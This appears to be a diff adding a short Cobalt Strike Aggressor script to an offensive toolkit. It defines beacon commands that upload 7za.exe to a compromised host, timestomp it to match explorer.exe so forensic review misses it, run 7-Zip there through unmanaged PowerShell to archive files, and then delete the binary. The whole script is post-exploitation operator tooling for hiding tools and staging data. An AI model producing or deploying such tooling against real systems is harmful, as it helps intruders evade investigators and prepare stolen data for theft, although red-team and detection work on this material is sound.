@@ -1,0 +1,21 @@
+include(script_resource("utils.cna"));
+
+# TODO use bupload_raw to put it somewhere else
+alias 7z-init {
+	$bid = $1;
+	blog($bid, 'Uploading 7za.exe');
+	bupload($bid, script_resource('tools/7za.exe'));
+	explorerstomp($bid, '7za.exe');
+}
+
+alias 7z {
+	$bid = $1;
+	shift(@_);
+	$line = join(' ', @_);
+	bpowerpick!($bid, "echo '7zip starting'; ./7za.exe $line ; echo '7zip finished';");
+}
+
+alias 7z-stop {
+	$bid = $1;
+	brm($bid, '7za.exe');
+}
